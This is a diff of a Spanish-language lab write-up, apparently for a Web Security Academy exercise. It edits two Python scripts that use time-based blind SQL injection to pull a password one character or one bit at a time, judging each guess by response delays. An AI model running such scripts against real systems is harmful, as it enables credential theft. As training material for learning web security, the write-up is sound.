@@ -65,7 +65,6 @@ Para automatizar las consultas, el siguiente es un ejemplo de *script* básico e
 ```python
 #!/usr/bin/python3
 import requests,time,sys,string
-
 # URL del laboratorio
 url = 'https://LAB-ID.web-security-academy.net'
 # Caracteres alfanuméricos (sin mayúsculas)
@@ -83,7 +82,6 @@ for position in range(1,21):
         time_start=time.time()
         requests.get(url, cookies=cookies)
         time_end = time.time()
-
         # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
         if time_end - time_start > 2:
             password += character
@@ -115,7 +113,6 @@ El primer `%d` corresponde a la posición de caracter de contraseña (1 a 20) y 
 ```python
 #!/usr/bin/python3
 import requests,time,sys
-
 # URL del laboratorio
 url = 'https://LAB-ID.web-security-academy.net'
 password = ""
@@ -133,14 +130,13 @@ for position in range(1,21):
         time_start=time.time()
         requests.get(url, cookies=cookies)
         time_end = time.time()
-
         # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
         if time_end - time_start > 2:
             byte += "0"
         else:
             byte += "1"
-
-    extracted_chr = chr(int(byte,2))
+    # Conversión del entero en base 2
+    extracted_chr = chr(int(byte, 2))
     password += extracted_chr
     sys.stdout.write(extracted_chr)
     sys.stdout.flush()
